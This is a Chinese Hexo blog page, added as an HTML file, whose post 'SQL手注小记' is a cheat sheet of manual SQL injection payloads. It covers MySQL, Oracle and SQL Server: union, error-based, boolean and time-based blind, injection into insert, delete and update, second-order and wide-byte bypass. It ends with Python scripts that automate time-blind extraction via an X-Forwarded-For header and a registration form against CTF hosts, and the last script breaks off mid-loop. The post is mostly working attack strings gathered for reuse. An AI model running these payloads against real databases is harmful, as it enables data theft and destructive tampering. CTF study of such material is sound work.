@@ -1,0 +1,1785 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.2.0">
+<script>
+(function(){
+    if(''){
+        if (prompt('请输入文章密码') !== ''){
+            alert('密码错误！');
+            history.back();
+        }
+    }
+})();
+</script>
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/aixin.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/aixin.png">
+  <link rel="mask-icon" href="/images/aixin.png" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//img.hzy2003628.top/busuanzi/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-big-counter.min.css">
+  <script src="true"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"hzy2003628.top","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"flat"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"valine","storage":true,"lazyload":false,"nav":null,"activeClass":"valine"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":false,"preload":true},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideLeftIn"}},"path":"search.xml"};
+  </script>
+
+
+
+<script>
+(function(){
+var src = "https://s.ssl.qhres2.com/ssl/ab77b6ea7f3fbf79.js";
+document.write('<script src="' + src + '" id="sozz"><\/script>');
+})();
+</script>
+
+
+
+
+<!-- title、keywords、desc关键字 -->
+
+  <title>微言</title>
+  <meta name="title" content="微言" />
+
+
+
+
+
+
+ <script>(function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/b6dbddb6.js","daovoice")
+ daovoice('init', {
+  app_id: "6f081c2c"
+});
+daovoice('update');
+ </script>
+ 
+
+
+
+
+
+<!-- 春节灯笼代码段 -->
+<div id="lantern-wrapper" class="lantern-wrapper" no-select></div>
+<script src="http://img.hzy2003628.top/busuanzi/lantern.min.js"></script>
+<script>
+    let lantern = new Lantern('lantern-wrapper', {
+        date: {								// 日期格式：'月-日'
+            from: '12-20',					// 开始悬挂灯笼的日期
+            to: '1-31'						// 结束悬挂灯笼的日期
+        },
+        postion: {
+            zIndex: 9999,					// 整个灯笼的 z-index 属性
+            lanternRL: [10, 150, 150, 10],	// 灯笼距离边界的距离：左侧灯笼距离左边的距离，右侧登录距离右侧的距离；页面灯笼从左往右依次设置
+            lanternTop: 0					// 灯笼距离顶部的距离。你也可以使用数组从左往右依次设置每个灯笼的距顶距离，例如：[0, 100, 200, 300]
+        },
+        content: '新春快乐'					 // 灯笼内显示的文字，只会截取前四个字符
+    });
+</script>
+
+
+  <meta name="description" content="SQL手注常用的语句,在这里记录一下方便后续直接用了">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL手注小记">
+<meta property="og:url" content="https://hzy2003628.top/2023/08/07/SQL%E6%89%8B%E6%B3%A8%E5%B0%8F%E8%AE%B0/index.html">
+<meta property="og:site_name" content="风尘孤狼">
+<meta property="og:description" content="SQL手注常用的语句,在这里记录一下方便后续直接用了">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-08-07T11:27:40.000Z">
+<meta property="article:modified_time" content="2023-08-07T04:45:44.693Z">
+<meta property="article:author" content="故里">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="SQL">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://hzy2003628.top/2023/08/07/SQL%E6%89%8B%E6%B3%A8%E5%B0%8F%E8%AE%B0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+
+
+  <title>SQL手注小记 | 风尘孤狼</title>
+  
+
+
+  <script data-pjax>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?d1ea9671a278a2cb33e24c76d08af22f";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+
+<!-- 加入APlayer音乐播放器 -->
+<link rel="stylesheet" href="/dist/APlayer.min.css">
+<div id="aplayer"></div>
+<script type="text/javascript" src="/dist/APlayer.min.js"></script>
+<script type="text/javascript" src="/dist/music.js"></script>
+
+  <div class="container">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">风尘孤狼</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">知识型学习记录</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">37</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">18</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">101</span></a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+        <li class="menu-item menu-item-love">
+
+    <a href="/Love/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Love</a>
+
+  </li>
+        <li class="menu-item menu-item-loveshow">
+
+    <a href="/LoveShow/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>LoveShow</a>
+
+  </li>
+        <li class="menu-item menu-item-whisper">
+
+    <a href="/Whisper/" rel="section"><i class="fa fa-calendar fa-fw"></i>微言</a>
+
+  </li>
+        <li class="menu-item menu-item-guestbook">
+
+    <a href="/guestbook/" rel="section"><i class="fa fa-book fa-fw"></i>留言板</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://hzy2003628.top/2023/08/07/SQL%E6%89%8B%E6%B3%A8%E5%B0%8F%E8%AE%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="故里">
+      <meta itemprop="description" content="没有所谓失败，除非你不再尝试">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="风尘孤狼">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SQL手注小记
+        </h1>
+
+        <div class="post-meta">  
+		 
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-08-07 19:27:40 / 修改时间：12:45:44" itemprop="dateCreated datePublished" datetime="2023-08-07T19:27:40+08:00">2023-08-07</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/2023/08/07/SQL%E6%89%8B%E6%B3%A8%E5%B0%8F%E8%AE%B0/" class="post-meta-item leancloud_visitors" data-flag-title="SQL手注小记" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2023/08/07/SQL%E6%89%8B%E6%B3%A8%E5%B0%8F%E8%AE%B0/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2023/08/07/SQL%E6%89%8B%E6%B3%A8%E5%B0%8F%E8%AE%B0/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>17k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>16 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>SQL手注常用的语句,在这里记录一下方便后续直接用了</p>
+<span id="more"></span>
+<p>一大早看见一个公众号的推文,SQL手注总结的不错,抄过来记录一下,以后遇到直接来取了直接用了</p>
+<h2 id="0x01-mysql-手工注入">0x01 Mysql 手工注入</h2>
+<h3 id="11-联合注入">1.1 联合注入</h3>
+<pre><code class="hljs plaintext">Copy?id=1&#x27; order by 4--+
+?id=0&#x27; union select 1,2,3,database()--+
+?id=0&#x27; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database() --+
+?id=0&#x27; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot; --+
+#group_concat(column_name) 可替换为 unhex(Hex(cast(column_name+as+char)))column_name
+
+?id=0&#x27; union select 1,2,3,group_concat(password) from users --+
+#group_concat 可替换为 concat_ws(&#x27;,&#x27;,id,users,password )
+
+?id=0&#x27; union select 1,2,3,password from users limit 0,1--+</code></pre>
+<h3 id="12-报错注入">1.2 报错注入</h3>
+<pre><code class="hljs plaintext">Copy1.floor()
+select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);
+
+2.extractvalue()
+select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));
+
+3.updatexml()
+select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));
+
+4.geometrycollection()
+select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));
+
+5.multipoint()
+select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));
+
+6.polygon()
+select * from test where id=1 and polygon((select * from(select * from(select user())a)b));
+
+7.multipolygon()
+select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));
+
+8.linestring()
+select * from test where id=1 and linestring((select * from(select * from(select user())a)b));
+
+9.multilinestring()
+select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));
+
+10.exp()
+select * from test where id=1 and exp(~(select * from(select user())a));</code></pre>
+<p>每个一个报错语句都有它的原理：</p>
+<p>exp() 报错的原理：exp 是一个数学函数，取e的x次方，当我们输入的值大于709就会报错，然后 ~ 取反它的值总会大于709，所以报错。</p>
+<p>updatexml() 报错的原理：由于 updatexml 的第二个参数需要 Xpath 格式的字符串，以 ~ 开头的内容不是 xml 格式的语法，concat() 函数为字符串连接函数显然不符合规则，但是会将括号内的执行结果以错误的形式报出，这样就可以实现报错注入了。</p>
+<pre><code class="hljs plaintext">Copy爆库：?id=1&#x27; and updatexml(1,(select concat(0x7e,(schema_name),0x7e) from information_schema.schemata limit 2,1),1) -- +
+爆表：?id=1&#x27; and updatexml(1,(select concat(0x7e,(table_name),0x7e) from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1),1) -- +
+爆字段：?id=1&#x27; and updatexml(1,(select concat(0x7e,(column_name),0x7e) from information_schema.columns where table_name=0x7573657273 limit 2,1),1) -- +
+爆数据：?id=1&#x27; and updatexml(1,(select concat(0x7e,password,0x7e) from users limit 1,1),1) -- +
+
+#concat 也可以放在外面 updatexml(1,concat(0x7e,(select password from users limit 1,1),0x7e),1)</code></pre>
+<p>这里需要注意的是它加了连接字符，导致数据中的 md5 只能爆出 31 位，这里可以用分割函数分割出来：</p>
+<pre><code class="hljs plaintext">Copysubstr(string string,num start,num length);
+#string为字符串,start为起始位置,length为长度
+
+?id=1&#x27; and updatexml(1,concat(0x7e, substr((select password from users limit 1,1),1,16),0x7e),1) -- +</code></pre>
+<h3 id="13-盲注">1.3 盲注</h3>
+<h4 id="131-时间盲注">1.3.1 时间盲注</h4>
+<p>时间盲注也叫延时注入 一般用到函数 sleep() BENCHMARK() 还可以使用笛卡尔积(尽量不要使用,内容太多会很慢很慢)</p>
+<p>一般时间盲注我们还需要使用条件判断函数</p>
+<pre><code class="hljs plaintext">Copy#if（expre1，expre2，expre3）
+当 expre1 为 true 时，返回 expre2，false 时，返回 expre3 
+
+#盲注的同时也配合着 mysql 提供的分割函
+substr、substring、left</code></pre>
+<p>我们一般喜欢把分割的函数编码一下，当然不编码也行，编码的好处就是可以不用引号，常用到的就有 ascii() hex() 等等</p>
+<pre><code class="hljs plaintext">Copy?id=1&#x27; and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5))--+
+?id=1&#x27; and if((substr((select user()),1,1)=&#x27;r&#x27;),sleep(5),1)--+</code></pre>
+<h4 id="132-布尔盲注">1.3.2 布尔盲注</h4>
+<pre><code class="hljs plaintext">Copy?id=1&#x27; and substr((select user()),1,1)=&#x27;r&#x27; -- +
+?id=1&#x27; and IFNULL((substr((select user()),1,1)=&#x27;r&#x27;),0) -- +
+#如果 IFNULL 第一个参数的表达式为 NULL，则返回第二个参数的备用值，不为 Null 则输出值
+
+?id=1&#x27; and strcmp((substr((select user()),1,1)=&#x27;r&#x27;),1) -- +
+#若所有的字符串均相同，STRCMP() 返回 0，若根据当前分类次序，第一个参数小于第二个，则返回 -1 ，其它情况返回 1</code></pre>
+<h3 id="14-insertdeleteupdate">1.4 insert,delete,update</h3>
+<p>insert,delete,update 主要是用到盲注和报错注入，此类注入点不建议使用 sqlmap 等工具，会造成大量垃圾数据，一般这种注入会出现在 注册、ip头、留言板等等需要写入数据的地方,同时这种注入不报错一般较难发现，我们可以尝试性插入、引号、双引号、转义符 \ 让语句不能正常执行，然后如果插入失败，更新失败，然后深入测试确定是否存在注入</p>
+<h4 id="141-报错">1.4.1 报错</h4>
+<pre><code class="hljs plaintext">Copymysql&gt; insert into admin (id,username,password) values (2,&quot;or updatexml(1,concat(0x7e,(version())),0) or&quot;,&quot;admin&quot;);
+Query OK, 1 row affected (0.00 sec)
+
+mysql&gt; select * from admin;
++------+-----------------------------------------------+----------+
+| id   | username                                      | password |
++------+-----------------------------------------------+----------+
+|    1 | admin                                         | admin    |
+|    1 | and 1=1                                       | admin    |
+|    2 | or updatexml(1,concat(0x7e,(version())),0) or | admin    |
++------+-----------------------------------------------+----------+
+3 rows in set (0.00 sec)
+
+mysql&gt; insert into admin (id,username,password) values (2,&quot;&quot;or updatexml(1,concat(0x7e,(version())),0) or&quot;&quot;,&quot;admin&quot;);
+ERROR 1105 (HY000): XPATH syntax error: &#x27;~5.5.53&#x27;
+
+#delete 注入很危险，很危险，很危险，切记不能使用 or 1=1 ，or 右边一定要为false
+mysql&gt; delete from admin where id =-2 or updatexml(1,concat(0x7e,(version())),0);
+ERROR 1105 (HY000): XPATH syntax error: &#x27;~5.5.53&#x27;</code></pre>
+<h4 id="142-盲注">1.4.2 盲注</h4>
+<pre><code class="hljs plaintext">Copy#int型 可以使用 运算符 比如 加减乘除 and or 异或 移位等等
+mysql&gt; insert into admin values (2+if((substr((select user()),1,1)=&#x27;r&#x27;),sleep(5),1),&#x27;1&#x27;,&quot;admin&quot;);
+Query OK, 1 row affected (5.00 sec)
+
+mysql&gt; insert into admin values (2+if((substr((select user()),1,1)=&#x27;p&#x27;),sleep(5),1),&#x27;1&#x27;,&quot;admin&quot;);
+Query OK, 1 row affected (0.00 sec)
+
+#字符型注意闭合不能使用and
+mysql&gt; insert into admin values (2,&#x27;&#x27;+if((substr((select user()),1,1)=&#x27;p&#x27;),sleep(5),1)+&#x27;&#x27;,&quot;admin&quot;);
+Query OK, 1 row affected (0.00 sec)
+
+mysql&gt; insert into admin values (2,&#x27;&#x27;+if((substr((select user()),1,1)=&#x27;r&#x27;),sleep(5),1)+&#x27;&#x27;,&quot;admin&quot;);
+Query OK, 1 row affected (5.01 sec)
+
+# delete 函数 or 右边一定要为 false
+mysql&gt; delete from admin where id =-2 or if((substr((select user()),1,1)=&#x27;r4&#x27;),sleep(5),0);
+Query OK, 0 rows affected (0.00 sec)
+
+mysql&gt; delete from admin where id =-2 or if((substr((select user()),1,1)=&#x27;r&#x27;),sleep(5),0);
+Query OK, 0 rows affected (5.00 sec)
+
+#update 更新数据内容
+mysql&gt; select * from admin;
++------+----------+----------+
+| id   | username | password |
++------+----------+----------+
+|    2 | 1        | admin    |
+|    2 | 1        | admin    |
+|    2 | 1        | admin    |
+|    2 | admin    | admin    |
++------+----------+----------+
+4 rows in set (0.00 sec)
+
+mysql&gt; update admin set id=&quot;5&quot;+sleep(5)+&quot;&quot; where id=2;
+Query OK, 4 rows affected (20.00 sec)
+Rows matched: 4  Changed: 4  Warnings: 0</code></pre>
+<h3 id="15-二次注入与宽字节注入">1.5 二次注入与宽字节注入</h3>
+<p>二次注入的语句：在没有被单引号包裹的sql语句下，我们可以用16进制编码他，这样就不会带有单引号等。</p>
+<pre><code class="hljs plaintext">Copymysql&gt; insert into admin (id,name,pass) values (&#x27;3&#x27;,0x61646d696e272d2d2b,&#x27;11&#x27;);
+Query OK, 1 row affected (0.00 sec)
+
+mysql&gt; select * from admin;
++----+-----------+-------+
+| id | name      | pass  |
++----+-----------+-------+
+|  1 | admin     | admin |
+|  2 | admin&#x27;111 | 11111 |
+|  3 | admin&#x27;--+ | 11    |
++----+-----------+-------+
+4 rows in set (0.00 sec)</code></pre>
+<p>二次注入在没有源码的情况比较难发现，通常见于注册，登录恶意账户后，数据库可能会因为恶意账户名的问题，将 admin’–+ 误认为 admin 账户</p>
+<p>宽字节注入：针对目标做了一定的防护，单引号转变为 <code>\'</code> , mysql 会将 <code>\</code> 编码为 <code>%5c</code> ，宽字节中两个字节代表一个汉字，所以把 <code>%df</code> 加上 <code>%5c</code> 就变成了一个汉字“運”，使用这种方法成功绕过转义，就是所谓的宽字节注入</p>
+<pre><code class="hljs plaintext">Copyid=-1%df&#x27; union select...
+
+#没使用宽字节
+%27 -&gt; %5C%27 
+
+#使用宽字节
+%df%27 -&gt; %df%5c%27 -&gt; 運&#x27;</code></pre>
+<h2 id="0x02-oracle-手工注入">0x02 Oracle 手工注入</h2>
+<h3 id="21-联合注入">2.1 联合注入</h3>
+<pre><code class="hljs plaintext">Copy?id=-1&#x27; union select user,null from dual--
+?id=-1&#x27; union select version,null from v$instance--
+?id=-1&#x27; union select table_name,null from (select * from (select rownum as limit,table_name from user_tables) where limit=3)--
+?id=-1&#x27; union select column_name,null from (select * from (select rownum as limit,column_name from user_tab_columns where table_name =&#x27;USERS&#x27;) where limit=2)--
+?id=-1&#x27; union select username,passwd from users--
+?id=-1&#x27; union select username,passwd from (select * from (select username,passwd,rownum as limit from users) where limit=3)--</code></pre>
+<h3 id="22-报错注入">2.2 报错注入</h3>
+<pre><code class="hljs plaintext">Copy?id=1&#x27; and 1=ctxsys.drithsx.sn(1,(select user from dual))--
+?id=1&#x27; and 1=ctxsys.drithsx.sn(1,(select banner from v$version where banner like &#x27;Oracle%))--
+?id=1&#x27; and 1=ctxsys.drithsx.sn(1,(select table_name from (select rownum as limit,table_name from user_tables) where limit= 3))--
+?id=1&#x27; and 1=ctxsys.drithsx.sn(1,(select column_name from (select rownum as limit,column_name from user_tab_columns where table_name =&#x27;USERS&#x27;) where limit=3))--
+?id=1&#x27; and 1=ctxsys.drithsx.sn(1,(select passwd from (select passwd,rownum as limit from users) where limit=1))--</code></pre>
+<h3 id="23-盲注">2.3 盲注</h3>
+<h4 id="231-布尔盲注">2.3.1 布尔盲注</h4>
+<p>既然是盲注，那么肯定涉及到条件判断语句，Oracle除了使用IF the else end if这种复杂的，还可以使用 decode() 函数。<br>
+语法：decode(条件,值1,返回值1,值2,返回值2,…值n,返回值n,缺省值);</p>
+<p>该函数的含义如下：</p>
+<pre><code class="hljs plaintext">CopyIF 条件=值1 THEN
+　　　　RETURN(返回值1)
+ELSIF 条件=值2 THEN
+　　　　RETURN(返回值2)
+　　　　......
+ELSIF 条件=值n THEN
+　　　　RETURN(返回值n)
+ELSE
+　　　　RETURN(缺省值)
+END IF
+Copy?id=1&#x27; and 1=(select decode(user,&#x27;SYSTEM&#x27;,1,0,0) from dual)--
+?id=1&#x27; and 1=(select decode(substr(user,1,1),&#x27;S&#x27;,1,0,0) from dual)--
+?id=1&#x27; and ascii(substr(user,1,1))&gt; 64--  #二分法</code></pre>
+<h4 id="232-时间盲注">2.3.2 时间盲注</h4>
+<p>可使用DBMS_PIPE.RECEIVE_MESSAGE(‘任意值’,延迟时间)函数进行时间盲注，这个函数可以指定延迟的时间</p>
+<pre><code class="hljs plaintext">Copy?id=1&#x27; and 1=(case when ascii(substr(user,1,1))&gt; 128 then DBMS_PIPE.RECEIVE_MESSAGE(&#x27;a&#x27;,5) else 1 end)--
+?id=1&#x27; and 1=(case when ascii(substr(user,1,1))&gt; 64 then DBMS_PIPE.RECEIVE_MESSAGE(&#x27;a&#x27;,5) else 1 end)--</code></pre>
+<h3 id></h3>
+<h2 id="0x03-sql-server-手工注入">0x03 SQL server 手工注入</h2>
+<h3 id="31-联合注入">3.1 联合注入</h3>
+<pre><code class="hljs plaintext">Copy?id=-1&#x27; union select null,null--
+?id=-1&#x27; union select @@servername, @@version--
+?id=-1&#x27; union select db_name(),suser_sname()--
+?id=-1&#x27; union select (select top 1 name from sys.databases where name not in (select top 6 name from sys.databases)),null--
+?id=-1&#x27; union select (select top 1 name from sys.databases where name not in (select top 7 name from sys.databasesl),null--
+?id--1&#x27; union select (select top 1 table_ name from information_schema.tables where table_name not in (select top 0 table_name from information_schema.tables)),null--
+?id=-1&#x27; union select (select top 1 column name from information_schema.columns where table_name=&#x27;users&#x27; and column_name not in (select top 1 column_name from information_schema.columns where table_name = &#x27;users&#x27;)),null---
+?id=-1&#x27; union select (select top 1 username from users where username not in (select top 3 username from users)),null--</code></pre>
+<h3 id="32-报错注入">3.2 报错注入</h3>
+<pre><code class="hljs plaintext">Copy?id=1&#x27; and 1=(select 1/@@servername)--
+?id=1&#x27; and 1=(select 1/(select top 1 name from sys.databases where name not in (select top 1 name from sys.databases))--</code></pre>
+<h3 id="33-盲注">3.3 盲注</h3>
+<h4 id="331-布尔盲注">3.3.1 布尔盲注</h4>
+<pre><code class="hljs plaintext">Copy?id=1&#x27; and ascii(substring((select db_ name(1)),1,1))&gt; 64--</code></pre>
+<h4 id="332-时间盲注">3.3.2 时间盲注</h4>
+<pre><code class="hljs plaintext">Copy?id= 1&#x27;;if(2&gt;1) waitfor delay &#x27;0:0:5&#x27;--
+?id= 1&#x27;;if(ASCII(SUBSTRING((select db_name(1)),1,1))&gt; 64) waitfor delay &#x27;0:0:2&#x27;--</code></pre>
+<h2 id="0x04-sql注入常用的脚本">0x04 SQL注入常用的脚本</h2>
+<h3 id="xff时间盲注二分法">XFF时间盲注二分法</h3>
+<pre><code class="hljs plaintext">import requests
+
+url=&quot;http://49.235.141.207:25501/test_sql/sql_ip_insert/&quot;
+flag=&#x27;&#x27;
+for i in range(1,50):
+    f1=flag
+    top=127
+    low=33
+    while low&lt;=top:
+        mid=(top+low)//2
+        p1=&quot;127.0.0.1&#x27; and (case when ascii(substr((select flag from flag) from &#123;&#125; for 1))&gt;&#123;&#125; then sleep(3) else 0 end) and &#x27;1&quot;.format(str(i),str(mid))
+        p2=&quot;127.0.0.1&#x27; and (case when ascii(substr((select flag from flag) from &#123;&#125; for 1))=&#123;&#125; then sleep(3) else 0 end) and &#x27;1&quot;.format(str(i),str(mid))
+        headers1=&#123;&#x27;X-Forwarded-For&#x27;:p1&#125;
+        headers2=&#123;&#x27;X-Forwarded-For&#x27;:p2&#125;
+        try:
+            print(i,mid)
+            r1=requests.get(url,headers=headers2,timeout=3)
+        except requests.exceptions.ReadTimeout as e:
+            flag+=chr(mid)
+            print(flag)
+            break
+        except Exception as e:
+            pass
+        else:
+            try:
+                r2=requests.get(url,headers=headers1,timeout=3)
+            except requests.exceptions.ReadTimeout as e:
+                low=mid+1
+            except Exception as e:
+                pass
+            else:
+                top=mid-1
+
+    if flag==f1:
+        break</code></pre>
+<h3 id="二分法时间盲注">二分法时间盲注</h3>
+<pre><code class="hljs plaintext">import requests
+
+url=&quot;http://e2237b8f-0ea4-4294-bbe7-007af8f88f8b.node3.buuoj.cn/register.php&quot;
+flag=&#x27;&#x27;
+proxies=&#123;
+    &quot;http&quot;:&quot;127.0.0.1:8080&quot;
+&#125;
+for i in range(1,50):
+    f1=flag
+    top=127
+    low=33
+    # print(1)
+    while low&lt;=top:
+        mid=(top+low)//2
+        p1=&quot;aaaaa&#x27; || (case when ascii(substr((select*from flag) from &#123;&#125; for 1))&gt;&#123;&#125; then sleep(3) else 0 end) || &#x27;aaa&quot;.format(i,mid)
+        p2=&quot;aaaaa&#x27; || (case when ascii(substr((select*from flag) from &#123;&#125; for 1))=&#123;&#125; then sleep(3) else 0 end) || &#x27;aaa&quot;.format(i,mid)
+        data1=&#123;&#x27;email&#x27;:&#x27;basb@qq.com&#x27;,&#x27;username&#x27;:p1,&#x27;password&#x27;:&#x27;1234&#x27;&#125;
+        data2=&#123;&#x27;email&#x27;:&#x27;basb@qq.com&#x27;,&#x27;username&#x27;:p2,&#x27;password&#x27;:&#x27;1234&#x27;&#125;
+        try:
+            print(i,mid)
+            r1=requests.post(url,data=data2,timeout=3,proxies=proxies)
